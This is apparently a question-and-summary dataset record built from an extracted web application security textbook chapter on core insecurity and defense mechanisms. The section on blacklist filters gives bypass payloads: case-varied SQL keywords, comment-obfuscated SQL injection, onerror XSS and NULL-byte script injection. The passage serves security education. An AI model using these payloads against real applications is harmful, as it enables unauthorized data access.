interfere with its logic, or execute commands on the database\nserver itself.\ncc0011..iinndddd 77 88//1199//22001111 1122::0022::0033 PPMM\nStuttard c01.indd V2 - 07/07/2011 Page 8\n8 Chapter 1 n Web Application (In)security\nn Cross-site scripting (94%) — This vulnerability enables an attacker to\ntarget other users of the application, potentially gaining access to their\ndata, performing unauthorized actions on their behalf, or carrying out\nother attacks against them.\nn Information leakage (78%) — This involves cases where an application\ndivulges sensitive information that is of use to an attacker in developing\nan assault against the application, through defective error handling or\nother behavior.\nn Cross-site request forgery (92%) — This fl aw means that application\nusers can be induced to perform unintended actions on the application\nwithin their user context and privilege level. The vulnerability allows a\nmalicious web site visited by the victim user to interact with the applica-\ntion to perform actions that the user did not intend.\nBroken authentication 62%\nBroken access controls 71%\nSQL injection 32%\nCross-site scripting 94%\nInformation leakage 78%\nCross-site request\n92%\nforgery\n0% 10% 20% 30% 40% 50% 60% 70% 80% 90% 100%\nIncidence in recently tested applications\nFigure 1-3: The incidence of some common web application vulnerabilities in\napplications recently tested by the authors (based on a sample of more than 100)\nSSL is an excellent technology that protects the confi dentiality and integrity\nof data in transit between the user’s browser and the web server. It helps defend\nagainst eavesdroppers, and it can provide assurance to the user of the identity of\nthe web server he is dealing with. But it does not stop attacks that directly target\nthe server or client components of an application, as most successful attacks do.\nSpecifi cally, it does not prevent any of the vulnerabilities just listed, or many\nothers that can render an application critically exposed to attack. Regardless of\nwhether they use SSL, most web applications still contain security fl aws.\ncc0011..iinndddd 88 88//1199//22001111 1122::0022::0033 PPMM\n\nStuttard c01.indd V2 - 07/07/2011 Page 9\nChapter 1 n Web Application (In)security 9\nThe Core Security Problem: Users Can Submit\nArbitrary Input\nAs with most distributed applications, web applications face a fundamental\nproblem they must address to be secure. Because the client is outside of the\napplication’s control, users can submit arbitrary input to the server-side appli-\ncation. The application must assume that all input is potentially malicious.\nTherefore, it must take steps to ensure that attackers cannot use crafted input\nto compromise the application by interfering with its logic and behavior, thus\ngaining unauthorized access to its data and functionality.\nThis core problem manifests itself in various ways:\nn Users can interfere with any piece of data transmitted between the client\nand the server, including request parameters, cookies, and HTTP head-\ners. Any security controls implemented on the client side, such as input\nvalidation checks, can be easily circumvented.\nn Users can send requests in any sequence and can submit parameters at a\ndifferent stage than the application expects, more than once, or not at all.\nAny assumption developers make about how users will interact with the\napplication may be violated.\nn Users are not restricted to using only a web browser to access the application.\nNumerous widely available tools operate alongside, or independently of,\na browser to help attack web applications. These tools can make requests\nthat no browser would ordinarily make and can generate huge numbers\nof requests quickly to fi nd and exploit problems.\nThe majority of attacks against web applications involve sending input to the\nserver that is crafted to cause some event that was not expected or desired by\nthe application’s designer. Here are some examples of submitting crafted input\nto achieve this objective:\nn Changing the price of a product transmitted in a hidden HTML form fi eld\nto fraudulently purchase the product for a cheaper amount\nn Modifying a session token transmitted in an HTTP cookie to hijack the\nsession of another authenticated user\nn Removing certain parameters that normally are submitted to exploit a\nlogic fl aw in the application’s processing\nn Altering some input that will be processed by a back-end database to inject\na malicious database query and access sensitive data\nNeedless to say, SSL does nothing to stop an attacker from submitting crafted\ninput to the server. If the application uses SSL, this simply means that other users\non the network cannot view or modify the attacker’s data in transit. Because\ncc0011..iinndddd 99 88//1199//22001111 1122::0022::0033 PPMM\n\nStuttard c01.indd V2 - 07/07/2011 Page 10\n10 Chapter 1 n Web Application (In)security\nthe attacker controls her end of the SSL tunnel, she can send anything she likes\nto the server through this tunnel. If any of the previously mentioned attacks\nare successful, the application is emphatically vulnerable, regardless of what\nits FAQ may tell you.\nKey Problem Factors\nThe core security problem faced by web applications arises in any situation\nwhere an application must accept and process untrusted data that may be mali-\ncious. However, in the case of web applications, several factors have combined\nto exacerbate the problem and explain why so many web applications on the\nInternet today do such a poor job of addressing it.\nUnderdeveloped Security Awareness\nAlthough awareness of web application security issues has grown in recent\nyears, it remains less well-developed than in longer-established areas such as\nnetworks and operating systems. Although most people working in IT security\nhave a reasonable grasp of the essentials of securing networks and hardening\nhosts, widespread confusion and misconception still exist about many of the\ncore concepts involved in web application security. A web application devel-\noper’s work increasingly involves weaving together tens, or even hundreds,\nof third-party packages, all designed to abstract the developer away from the\nunderlying technologies. It is common to meet experienced web application\ndevelopers who make major assumptions about the security provided by their\nprogramming framework and to whom an explanation of many basic types of\nfl aws comes as a revelation.\nCustom Development\nMost web applications are developed in-house by an organization’s own staff\nor third-party contractors. Even where an application employs well-established\ncomponents, these are typically customized or bolted together using new code.\nIn this situation, every application is different and may contain its own unique\ndefects. This stands in contrast to a typical infrastructure deployment, in which\nan organization can purchase a best-of-breed product and install it in line with\nindustry-standard guidelines.\nDeceptive Simplicity\nWith today’s web application platforms and development tools, it is possible for\na novice programmer to create a powerful application from scratch in a short\nperiod of time. But there is a huge difference between producing code that is\ncc0011..iinndddd 1100 88//1199//22001111 1122::0022::0033 PPMM\nStuttard c01.indd V2 - 07/07/2011 Page 11\nChapter 1 n Web Application (In)security 11\nfunctional and code that is secure. Many web applications are created by well-\nmeaning individuals who simply lack the knowledge and experience to identify\nwhere security problems may arise.\nA prominent trend in recent years has been the use of application frameworks\nthat provide ready-made code components to handle numerous common areas\nof functionality, such as authentication, page templates, message boards, and\nintegration with common back-end infrastructure components. Examples of these\nframeworks include Liferay and Appfuse. These products make it quick and\neasy to create working applications without requiring a technical understanding\nof how the applications work or the potential risks they may contain. This also\nmeans many companies use the same frameworks. Thus, when a vulnerability\nis discovered, it affects many unrelated applications.\nRapidly Evolving Threat Profi le\nResearch into web application attacks and defenses continues to be a thriving\narea in which new concepts and threats are conceived at a faster rate than is now\nthe case for older technologies. Particularly on the client side, it is common for\nthe accepted defenses against a particular attack to be undermined by research\nthat demonstrates a new attack technique. A development team that begins a\nproject with a complete knowledge of current threats may have lost this status\nby the time the application is completed and deployed.\nResource and Time Constraints\nMost web application development projects are subject to strict constraints on\ntime and resources, arising from the economics of in-house, one-off develop-\nment. In most organizations, it is often infeasible to employ dedicated security\nexpertise in the design or development teams. And due to project slippage,\nsecurity testing by specialists is often left until very late in the project’s life\ncycle. In the balancing of competing priorities, the need to produce a stable and\nfunctional application by a deadline normally overrides less tangible security\nconsiderations. A typical small organization may be willing to pay for only a\nfew man-days of consulting time to evaluate a new application. A quick pen-\netration test will often fi nd the low-hanging fruit, but it may miss more subtle\nvulnerabilities that require time and patience to identify.\nOverextended Technologies\nMany of the core technologies employed in web applications began life when\nthe landscape of the World Wide Web was very different. They have since been\npushed far beyond the purposes for which they were originally conceived, such\nas the use of JavaScript as a means of data transmission in many AJAX-based\ncc0011..iinndddd 1111 88//1199//22001111 1122::0022::0033 PPMM\n\nStuttard c01.indd V2 - 07/07/2011 Page 12\n12 Chapter 1 n Web Application (In)security\napplications. As the expectations placed on web application functionality have\nrapidly evolved, the technologies used to implement this functionality have\nlagged behind the curve, with old technologies stretched and adapted to meet\nnew requirements. Unsurprisingly, this has led to security vulnerabilities as\nunforeseen side effects emerge.\nIncreasing Demands on Functionality\nApplications are designed primarily with functionality and usability in mind.\nOnce-static user profi les now contain social networking features, allowing upload-\ning of pictures and wiki-style editing of pages. A few years ago an application\ndesigner may have been content with implementing a username and password\nchallenge to create the login functionality. Modern sites may include password\nrecovery, username recovery, password hints, and an option to remember the\nusername and password on future visits. Such a site would undoubtedly be\npromoted as having numerous security features, yet each one is really a self-\nservice feature adding to the site’s attack surface.\nThe New Security Perimeter\nBefore the rise of web applications, organizations’ efforts to secure themselves\nagainst external attack were largely focused on the network perimeter. Defending\nthis perimeter entailed hardening and patching the services it needed to expose\nand fi rewalling access to others.\nWeb applications have changed all this. For an application to be accessible\nby its users, the perimeter fi rewall must allow inbound connections to the\nserver over HTTP or HTTPS. And for the application to function, the server\nmust be allowed to connect to supporting back-end systems, such as databases,\nmainframes, and fi nancial and logistical systems. These systems often lie at\nthe core of the organization’s operations and reside behind several layers of\nnetwork-level defenses.\nIf a vulnerability exists within a web application, an attacker on the public\nInternet may be able to compromise the organization’s core back-end systems\nsolely by submitting crafted data from his web browser. This data sails past all\nthe organization’s network defenses, in the same way as does ordinary, benign\ntraffi c to the web application.\nThe effect of widespread deployment of web applications is that the security\nperimeter of a typical organization has moved. Part of that perimeter is still\nembodied in fi rewalls and bastion hosts. But a signifi cant part of it is now occupied\nby the organization’s web applications. Because of the manifold ways in which\nweb applications receive user input and pass this to sensitive back-end systems,\nthey are the potential gateways for a wide range of attacks, and defenses against\nthese attacks must be implemented within the applications themselves. A single\ncc0011..iinndddd 1122 88//1199//22001111 1122::0022::0044 PPMM\nStuttard c01.indd V2 - 07/07/2011 Page 13\nChapter 1 n Web Application (In)security 13\nline of defective code in a single web application can render an organization’s\ninternal systems vulnerable. Furthermore, with the rise of mash-up applications,\nthird-party widgets, and other techniques for cross-domain integration, the\nserver-side security perimeter frequently extends well beyond the organization\nitself. Implicit trust is placed in the services of external applications and services.\nThe statistics described previously, of the incidence of vulnerabilities within\nthis new security perimeter, should give every organization pause for thought.\nNOTE For an attacker targeting an organization, gaining access to the net-\nwork or executing arbitrary commands on servers may not be what he wants\nto achieve. Often, and perhaps typically, what an attacker really wants is to\nperform some application-level action such as stealing personal informa-\ntion, transferring funds, or making cheap purchases. And the relocation of the\nsecurity perimeter to the application layer may greatly assist an attacker in\nachieving these objectives.\nFor example, suppose that an attacker wants to “hack in” to a bank’s systems\nand steal money from users’ accounts. In the past, before the bank deployed\na web application, the attacker might have needed to fi nd a vulnerability\nin a publicly reachable service, exploit this to gain a toehold on the bank’s\nDMZ, penetrate the fi rewall restricting access to its internal systems, map the\nnetwork to fi nd the mainframe computer, decipher the arcane protocol used\nto access it, and guess some credentials to log in. However, if the bank now\ndeploys a vulnerable web application, the attacker may be able to achieve the\nsame outcome simply by modifying an account number in a hidden fi eld of an\nHTML form.\nA second way in which web applications have moved the security perimeter\narises from the threats that users themselves face when they access a vulner-\nable application. A malicious attacker can leverage a benign but vulnerable web\napplication to attack any user who visits it. If that user is located on an internal\ncorporate network, the attacker may harness the user’s browser to launch an\nattack against the local network from the user’s trusted position. Without any\ncooperation from the user, the attacker may be able to carry out any action that\nthe user could perform if she were herself malicious. With the proliferation of\nbrowser extension technologies and plug-ins, the extent of the client-side attack\nsurface has increased considerably.\nNetwork administrators are familiar with the idea of preventing their users\nfrom visiting malicious web sites, and end users themselves are gradually becom-\ning more aware of this threat. But the nature of web application vulnerabilities\nmeans that a vulnerable application may present no less of a threat to its users\nand their organization than a web site that is overtly malicious. Correspondingly,\nthe new security perimeter imposes a duty of care on all application owners\nto protect their users from attacks against them delivered via the application.\ncc0011..iinndddd 1133 88//1199//22001111 1122::0022::0044 PPMM\n\nStuttard c01.indd V2 - 07/07/2011 Page 14\n14 Chapter 1 n Web Application (In)security\nA further way in which the security perimeter has partly moved to the cli-\nent side is through the widespread use of e-mail as an extended authentication\nmechanism. A huge number of today’s applications contain “forgotten password”\nfunctions that allow an attacker to generate an account recovery e-mail to any\nregistered address, without requiring any other user-specifi c information. This\nallows an attacker who compromises a user’s web mail account to easily escalate\nthe attack and compromise the victim’s accounts on most of the web applications\nfor which the victim is registered.\nThe Future of Web Application Security\nOver a decade after their widespread adoption, web applications on the Internet\ntoday are still rife with vulnerabilities. Understanding of the security threats\nfacing web applications, and effective ways of addressing these, are still underde-\nveloped within the industry. There is currently little indication that the problem\nfactors described in this chapter will disappear in the near future.\nThat said, the details of the web application security landscape are not static.\nEven though old and well-understood vulnerabilities such as SQL injection\ncontinue to appear, their prevalence is gradually diminishing. Furthermore,\nthe instances that remain are becoming more diffi cult to fi nd and exploit. New\nresearch in these areas is generally focused on developing advanced techniques\nfor attacking more subtle manifestations of vulnerabilities that a few years ago\ncould be easily detected and exploited using only a browser.\nA second prominent trend has been a gradual shift in attention from attacks\nagainst the server side of the application to those that target application users.\nThe latter kind of attack still leverages defects within the application itself, but\nit generally involves some kind of interaction with another user to compromise\nthat user’s dealings with the vulnerable application. This is a trend that has\nbeen replicated in other areas of software security. As awareness of security\nthreats matures, fl aws in the server side are the fi rst to be well understood and\naddressed, leaving the client side as a key battleground as the learning process\ncontinues. Of all the attacks described in this book, those against other users\nare evolving the most quickly, and they have been the focus of most research\nin recent years.\nVarious recent trends in technology have somewhat altered the landscape of\nweb applications. Popular consciousness about these trends exists by means of\nvarious rather misleading buzzwords, the most prominent of which are these:\nn Web 2.0 — This term refers to the greater use of functionality that enables\nuser-generated content and information sharing, and also the adoption\nof various technologies that broadly support this functionality, including\nasynchronous HTTP requests and cross-domain integration.\ncc0011..iinndddd 1144 88//1199//22001111 1122::0022::0044 PPMM\n\nStuttard c01.indd V2 - 07/07/2011 Page 15\nChapter 1 n Web Application (In)security 15\nn Cloud computing — This term refers to greater use of external service\nproviders for various parts of the technology stack, including applica-\ntion software, application platforms, web server software, databases, and\nhardware. It also refers to increased usage of virtualization technologies\nwithin hosting environments.\nAs with most changes in technology, these trends have brought with them\nsome new attacks and variations on existing attacks. Notwithstanding the hype,\nthe issues raised are not quite as revolutionary as they may initially appear. We\nwill examine the security implications of these and other recent trends in the\nappropriate locations throughout this book.\nDespite all the changes that have occurred within web applications, some\ncategories of “classic” vulnerabilities show no sign of diminishing. They continue\nto arise in pretty much the same form as they did in the earliest days of the\nweb. These include defects in business logic, failures to properly apply access\ncontrols, and other design issues. Even in a world of bolted-together applica-\ntion components and everything-as-a-service, these timeless issues are likely\nto remain widespread.\nSummary\nIn a little over a decade, the World Wide Web has evolved from purely static\ninformation repositories into highly functional applications that process sensitive\ndata and perform powerful actions with real-world consequences. During this\ndevelopment, several factors have combined to bring about the weak security\nposture demonstrated by the majority of today’s web applications.\nMost applications face the core security problem that users can submit arbi-\ntrary input. Every aspect of the user’s interaction with the application may be\nmalicious and should be regarded as such unless proven otherwise. Failure to\nproperly address this problem can leave applications vulnerable to attack in\nnumerous ways.\nAll the evidence about the current state of web application security indicates\nthat although some aspects of security have indeed improved, entirely new\nthreats have evolved to replace them. The overall problem has not been resolved\non any signifi cant scale. Attacks against web applications still present a serious\nthreat to both the organizations that deploy them and the users who access them.\ncc0011..iinndddd 1155 88//1199//22001111 1122::0022::0044 PPMM\nStuttard c01.indd V2 - 07/07/2011 Page 16\ncc0011..iinndddd 1166 88//1199//22001111 1122::0022::0044 PPMM",
    "question": "What are the key security challenges and factors contributing to the vulnerabilities in modern web applications?",
    "summary": "Web applications have evolved from static information repositories to complex, functional systems that handle sensitive data. However, they are often insecure due to the risk of arbitrary user input and a variety of factors like limited security awareness and resource constraints. Despite some improvements in security, new threats continue to emerge, making web application security a critical concern for both organizations and users."
  },
  {
    "start": 24,
    "end": 38,
    "text": "Stuttard c02.indd V3 - 07/22/2011 Page 17\n\nCHAPTER\n2\nCore Defense Mechanisms\nThe fundamental security problem with web applications — that all user input\nis untrusted — gives rise to a number of security mechanisms that applica-\ntions use to defend themselves against attack. Virtually all applications employ\nmechanisms that are conceptually similar, although the details of the design\nand the effectiveness of the implementation vary greatly.\nThe defense mechanisms employed by web applications comprise the following\ncore elements:\nn Handling user access to the application’s data and functionality to prevent\nusers from gaining unauthorized access\nn Handling user input to the application’s functions to prevent malformed\ninput from causing undesirable behavior\nn Handling attackers to ensure that the application behaves appropriately\nwhen being directly targeted, taking suitable defensive and offensive\nmeasures to frustrate the attacker\nn Managing the application itself by enabling administrators to monitor its\nactivities and confi gure its functionality\nBecause of their central role in addressing the core security problem, these\nmechanisms also make up the vast majority of a typical application’s attack\nsurface. If knowing your enemy is the fi rst rule of warfare, then understanding\nthese mechanisms thoroughly is the main prerequisite for being able to attack\n17\ncc0022..iinndddd 1177 88//1199//22001111 1122::0022::4411 PPMM\n\nStuttard c02.indd V3 - 07/22/2011 Page 18\n18 Chapter 2 n Core Defense Mechanisms\napplications effectively. If you are new to hacking web applications (and even\nif you are not), you should be sure to take time to understand how these core\nmechanisms work in each of the applications you encounter, and identify the\nweak points that leave them vulnerable to attack.\nHandling User Access\nA central security requirement that virtually any application needs to meet is\ncontrolling users’ access to its data and functionality. A typical situation has\nseveral different categories of user, such as anonymous users, ordinary authenti-\ncated users, and administrative users. Furthermore, in many situations different\nusers are permitted to access a different set of data. For example, users of a web\nmail application should be able to read their own e-mail but not other people’s.\nMost web applications handle access using a trio of interrelated security\nmechanisms:\nn Authentication\nn Session management\nn Access control\nEach of these mechanisms represents a signifi cant area of an application’s\nattack surface, and each is fundamental to an application’s overall security\nposture. Because of their interdependencies, the overall security provided by\nthe mechanisms is only as strong as the weakest link in the chain. A defect in\nany single component may enable an attacker to gain unrestricted access to the\napplication’s functionality and data.\nAuthentication\nThe authentication mechanism is logically the most basic dependency in an\napplication’s handling of user access. Authenticating a user involves establishing\nthat the user is in fact who he claims to be. Without this facility, the application\nwould need to treat all users as anonymous — the lowest possible level of trust.\nThe majority of today’s web applications employ the conventional authen-\ntication model, in which the user submits a username and password, which\nthe application checks for validity. Figure 2-1 shows a typical login function.\nIn security-critical applications such as those used by online banks, this basic\nmodel is usually supplemented by additional credentials and a multistage login\nprocess. When security requirements are higher still, other authentication mod-\nels may be used, based on client certifi cates, smartcards, or challenge-response\ntokens. In addition to the core login process, authentication mechanisms often\nemploy a range of other supporting functionality, such as self-registration,\naccount recovery, and a password change facility.\ncc0022..iinndddd 1188 88//1199//22001111 1122::0022::4411 PPMM\n\nStuttard c02.indd V3 - 07/22/2011 Page 19\nChapter 2 n Core Defense Mechanisms 19\nFigure 2-1: A typical login function\nDespite their superfi cial simplicity, authentication mechanisms suffer from a\nwide range of defects in both design and implementation. Common problems\nmay enable an attacker to identify other users’ usernames, guess their pass-\nwords, or bypass the login function by exploiting defects in its logic. When\nyou are attacking a web application, you should invest a signifi cant amount of\nattention to the various authentication-related functions it contains. Surprisingly\nfrequently, defects in this functionality enable you to gain unauthorized access\nto sensitive data and functionality.\nSession Management\nThe next logical task in the process of handling user access is to manage the\nauthenticated user’s session. After successfully logging in to the application, the\nuser accesses various pages and functions, making a series of HTTP requests from\nhis browser. At the same time, the application receives countless other requests\nfrom different users, some of whom are authenticated and some of whom are\nanonymous. To enforce effective access control, the application needs a way to\nidentify and process the series of requests that originate from each unique user.\nVirtually all web applications meet this requirement by creating a session for\neach user and issuing the user a token that identifi es the session. The session\nitself is a set of data structures held on the server that track the state of the user’s\ninteraction with the application. The token is a unique string that the applica-\ntion maps to the session. When a user receives a token, the browser automati-\ncally submits it back to the server in each subsequent HTTP request, enabling\nthe application to associate the request with that user. HTTP cookies are the\nstandard method for transmitting session tokens, although many applications\nuse hidden form fi elds or the URL query string for this purpose. If a user does\nnot make a request for a certain amount of time, the session is ideally expired,\nas shown in Figure 2-2.\ncc0022..iinndddd 1199 88//1199//22001111 1122::0022::4411 PPMM\n\nStuttard c02.indd V3 - 07/22/2011 Page 20\n20 Chapter 2 n Core Defense Mechanisms\nFigure 2-2: An application enforcing session timeout\nIn terms of attack surface, the session management mechanism is highly\ndependent on the security of its tokens. The majority of attacks against it seek to\ncompromise the tokens issued to other users. If this is possible, an attacker can\nmasquerade as the victim user and use the application just as if he had actually\nauthenticated as that user. The principal areas of vulnerability arise from defects\nin how tokens are generated, enabling an attacker to guess the tokens issued to\nother users, and defects in how tokens are subsequently handled, enabling an\nattacker to capture other users’ tokens.\nA small number of applications dispense with the need for session tokens by\nusing other means of reidentifying users across multiple requests. If HTTP’s\nbuilt-in authentication mechanism is used, the browser automatically resubmits\nthe user’s credentials with each request, enabling the application to identify the\nuser directly from these. In other cases, the application stores the state infor-\nmation on the client side rather than the server, usually in encrypted form to\nprevent tampering.\nAccess Control\nThe fi nal logical step in the process of handling user access is to make and enforce\ncorrect decisions about whether each individual request should be permitted or\ndenied. If the mechanisms just described are functioning correctly, the applica-\ntion knows the identity of the user from whom each request is received. On this\nbasis, it needs to decide whether that user is authorized to perform the action,\nor access the data, that he is requesting, as shown in Figure 2-3.\nThe access control mechanism usually needs to implement some fi ne-grained\nlogic, with different considerations being relevant to different areas of the\napplication and different types of functionality. An application might support\nnumerous user roles, each involving different combinations of specifi c privileges.\nIndividual users may be permitted to access a subset of the total data held within\nthe application. Specifi c functions may implement transaction limits and other\nchecks, all of which need to be properly enforced based on the user’s identity.\nBecause of the complex nature of typical access control requirements, this\nmechanism is a frequent source of security vulnerabilities that enable an attacker\ncc0022..iinndddd 2200 88//1199//22001111 1122::0022::4422 PPMM\n\nStuttard c02.indd V3 - 07/22/2011 Page 21\nChapter 2 n Core Defense Mechanisms 21\nto gain unauthorized access to data and functionality. Developers often make\nfl awed assumptions about how users will interact with the application and\nfrequently make oversights by omitting access control checks from some appli-\ncation functions. Probing for these vulnerabilities is often laborious, because\nessentially the same checks need to be repeated for each item of functionality.\nBecause of the prevalence of access control fl aws, however, this effort is always\na worthwhile investment when you are attacking a web application. Chapter\n8 describes how you can automate some of the effort involved in performing\nrigorous access control testing.\nFigure 2-3: An application enforcing access control\nHandling User Input\nRecall the fundamental security problem described in Chapter 1: All user input\nis untrusted. A huge variety of attacks against web applications involve submit-\nting unexpected input, crafted to cause behavior that was not intended by the\napplication’s designers. Correspondingly, a key requirement for an application’s\nsecurity defenses is that the application must handle user input in a safe manner.\nInput-based vulnerabilities can arise anywhere within an application’s func-\ntionality, and in relation to practically every type of technology in common use.\n“Input validation” is often cited as the necessary defense against these attacks.\nHowever, no single protective mechanism can be employed everywhere, and\ndefending against malicious input is often not as straightforward as it sounds.\nVarieties of Input\nA typical web application processes user-supplied data in many different forms.\nSome kinds of input validation may not be feasible or desirable for all these\nforms of input. Figure 2-4 shows the kind of input validation often performed\nby a user registration function.\ncc0022..iinndddd 2211 88//1199//22001111 1122::0022::4422 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 22\n22 Chapter 2 n Core Defense Mechanisms\nMust contain at least 4 characters\nMust contain at least 4 characters\nPlease provide a valid email address\nMust contain only numbers\nFigure 2-4: An application performing input validation\nIn many cases, an application may be able to impose very stringent valida-\ntion checks on a specifi c item of input. For example, a username submitted to a\nlogin function may be required to have a maximum length of eight characters\nand contain only alphabetical characters.\nIn other cases, the application must tolerate a wider range of possible input.\nFor example, an address fi eld submitted to a personal details page might legiti-\nmately contain letters, numbers, spaces, hyphens, apostrophes, and other char-\nacters. However, for this item, restrictions still can be feasibly imposed. The data\nshould not exceed a reasonable length limit (such as 50 characters) and should\nnot contain any HTML markup.\nIn some situations, an application may need to accept arbitrary input from\nusers. For example, a user of a blogging application may create a blog whose\nsubject is web application hacking. Posts and comments made to the blog may\nquite legitimately contain explicit attack strings that are being discussed. The\napplication may need to store this input in a database, write it to disk, and display\nit back to users in a safe way. It cannot simply reject the input just because it\nlooks potentially malicious without substantially diminishing the application’s\nvalue to some of its user base.\nIn addition to the various kinds of input that users enter using the browser\ninterface, a typical application receives numerous items of data that began their\nlife on the server and that are sent to the client so that the client can transmit\nthem back to the server on subsequent requests. This includes items such as\ncookies and hidden form fi elds, which are not seen by ordinary users of the\napplication but which an attacker can of course view and modify. In these cases,\napplications can often perform very specifi c validation of the data received. For\nexample, a parameter might be required to have one of a specifi c set of known\nvalues, such as a cookie indicating the user’s preferred language, or to be in a\nspecifi c format, such as a customer ID number. Furthermore, when an applica-\ntion detects that server-generated data has been modifi ed in a way that is not\npossible for an ordinary user with a standard browser, this often indicates\nthat the user is attempting to probe the application for vulnerabilities. In these\ncc0022..iinndddd 2222 88//1199//22001111 1122::0022::4422 PPMM\n\nStuttard c02.indd V3 - 07/22/2011 Page 23\nChapter 2 n Core Defense Mechanisms 23\ncases, the application should reject the request and log the incident for potential\ninvestigation (see the “Handling Attackers” sectionlater in this chapter).\nApproaches to Input Handling\nVarious broad approaches are commonly taken to the problem of handling\nuser input. Different approaches are often preferable for different situations\nand different types of input, and a combination of approaches may sometimes\nbe desirable.\n“Reject Known Bad”\nThis approach typically employs a blacklist containing a set of literal strings or\npatterns that are known to be used in attacks. The validation mechanism blocks\nany data that matches the blacklist and allows everything else.\nIn general, this is regarded as the least effective approach to validating user\ninput, for two main reasons. First, a typical vulnerability in a web applica-\ntion can be exploited using a wide variety of input, which may be encoded or\nrepresented in various ways. Except in the simplest of cases, it is likely that a\nblacklist will omit some patterns of input that can be used to attack the applica-\ntion. Second, techniques for exploitation are constantly evolving. Novel methods\nfor exploiting existing categories of vulnerabilities are unlikely to be blocked\nby current blacklists.\nMany blacklist-based fi lters can be bypassed with almost embarrassing ease\nby making trivial adjustments to the input that is being blocked. For example:\nn IfSELECT is blocked, try SeLeCt\nn Ifor 1=1-- is blocked, try or 2=2--\nn If alert(‘xss’) is blocked, try prompt(‘xss’)\nIn other cases, fi lters designed to block specifi c keywords can be bypassed by\nusing nonstandard characters between expressions to disrupt the tokenizing\nperformed by the application. For example:\nSELECT/*foo*/username,password/*foo*/FROM/*foo*/users\n<img%09onerror=alert(1) src=a>\nFinally, numerous blacklist-based fi lters, particularly those implemented in\nweb application fi rewalls, have been vulnerable to NULL byte attacks. Because\nof the different ways in which strings are handled in managed and unmanaged\nexecution contexts, inserting a NULL byte anywhere before a blocked expression\ncan cause some fi lters to stop processing the input and therefore not identify\nthe expression. For example:\n%00<script>alert(1)</script>\ncc0022..iinndddd 2233 88//1199//22001111 1122::0022::4422 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 24\n24 Chapter 2 n Core Defense Mechanisms\nVarious other techniques for attacking web application fi rewalls are described\nin Chapter 18.\nNOTE Attacks that exploit the handling of NULL bytes arise in many areas\nof web application security. In contexts where a NULL byte acts as a string\ndelimiter, it can be used to terminate a fi lename or a query to some back-\nend component. In contexts where NULL bytes are tolerated and ignored\n(for example, within HTML in some browsers), arbitrary NULL bytes can be\ninserted within blocked expressions to defeat some blacklist-based fi lters.\nAttacks of this kind are discussed in detail in later chapters.\n“Accept Known Good”\nThis approach employs a whitelist containing a set of literal strings or patterns,\nor a set of criteria, that is known to match only benign input. The validation\nmechanism allows data that matches the whitelist and blocks everything else.\nFor example, before looking up a requested product code in the database, an\napplication might validate that it contains only alphanumeric characters and is\nexactly six characters long. Given the subsequent processing that will be done\non the product code, the developers know that input passing this test cannot\npossibly cause any problems.\nIn cases where this approach is feasible, it is regarded as the most effective\nway to handle potentially malicious input. Provided that due care is taken in\nconstructing the whitelist, an attacker will be unable to use crafted input to\ninterfere with the application’s behavior. However, in numerous situations an\napplication must accept data for processing that does not meet any reasonable\ncriteria for what is known to be “good.” For example, some people’s names contain\nan apostrophe or hyphen. These can be used in attacks against databases, but\nit may be a requirement that the application should permit anyone to register\nunder his or her real name. Hence, although it is often extremely effective, the\nwhitelist-based approach does not represent an all-purpose solution to the\nproblem of handling user input.\nSanitization\nThis approach recognizes the need to sometimes accept data that cannot be\nguaranteed as safe. Instead of rejecting this input, the application sanitizes it\nin various ways to prevent it from having any adverse effects. Potentially mali-\ncious characters may be removed from the data, leaving only what is known to\nbe safe, or they may be suitably encoded or “escaped” before further processing\nis performed.\nApproaches based on data sanitization are often highly effective, and in many\nsituations they can be relied on as a general solution to the problem of malicious\ncc0022..iinndddd 2244 88//1199//22001111 1122::0022::4422 PPMM\n\nStuttard c02.indd V3 - 07/22/2011 Page 25\nChapter 2 n Core Defense Mechanisms 25\ninput. For example, the usual defense against cross-site scripting attacks is to\nHTML-encode dangerous characters before these are embedded into pages of the\napplication (see Chapter 12). However, effective sanitization may be diffi cult to\nachieve if several kinds of potentially malicious data need to be accommodated\nwithin one item of input. In this situation, a boundary validation approach is\ndesirable, as described later.\nSafe Data Handling\nMany web application vulnerabilities arise because user-supplied data is pro-\ncessed in unsafe ways. Vulnerabilities often can be avoided not by validating\nthe input itself but by ensuring that the processing that is performed on it is\ninherently safe. In some situations, safe programming methods are available\nthat avoid common problems. For example, SQL injection attacks can be pre-\nvented through the correct use of parameterized queries for database access\n(see Chapter 9). In other situations, application functionality can be designed\nin such a way that inherently unsafe practices, such as passing user input to an\noperating system command interpreter, are avoided.\nThis approach cannot be applied to every kind of task that web applications\nneed to perform. But where it is available, it is an effective general approach to\nhandling potentially malicious input.\nSemantic Checks\nThe defenses described so far all address the need to defend the application against\nvarious kinds of malformed data whose content has been crafted to interfere\nwith the application’s processing. However, with some vulnerabilities the input\nsupplied by the attacker is identical to the input that an ordinary, nonmalicious\nuser may submit. What makes it malicious is the different circumstances under\nwhich it is submitted. For example, an attacker might seek to gain access to\nanother user’s bank account by changing an account number transmitted in a\nhidden form fi eld. No amount of syntactic validation will distinguish between\nthe user’s data and the attacker’s. To prevent unauthorized access, the applica-\ntion needs to validate that the account number submitted belongs to the user\nwho has submitted it.\nBoundary Validation\nThe idea of validating data across trust boundaries is a familiar one. The core\nsecurity problem with web applications arises because data received from users\nis untrusted. Although input validation checks implemented on the client side\nmay improve performance and the user’s experience, they do not provide any\nassurance about the data that actually reaches the server. The point at which\ncc0022..iinndddd 2255 88//1199//22001111 1122::0022::4422 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 26\n26 Chapter 2 n Core Defense Mechanisms\nuser data is fi rst received by the server-side application represents a huge trust\nboundary. At this point the application needs to take measures to defend itself\nagainst malicious input.\nGiven the nature of the core problem, it is tempting to think of the input\nvalidation problem in terms of a frontier between the Internet, which is “bad”\nand untrusted, and the server-side application, which is “good” and trusted. In\nthis picture, the role of input validation is to clean potentially malicious data on\narrival and then pass the clean data to the trusted application. From this point\nonward, the data may be trusted and processed without any further checks or\nconcern about possible attacks.\nAs will become evident when we begin to examine some actual vulnerabili-\nties, this simple picture of input validation is inadequate for several reasons:\nn Given the wide range of functionality that applications implement, and the\ndifferent technologies in use, a typical application needs to defend itself\nagainst a huge variety of input-based attacks, each of which may employ\na diverse set of crafted data. It would be very diffi cult to devise a single\nmechanism at the external boundary to defend against all these attacks.\nn Many application functions involve chaining together a series of different\ntypes of processing. A single piece of user-supplied input might result in\na number of operations in different components, with the output of each\nbeing used as the input for the next. As the data is 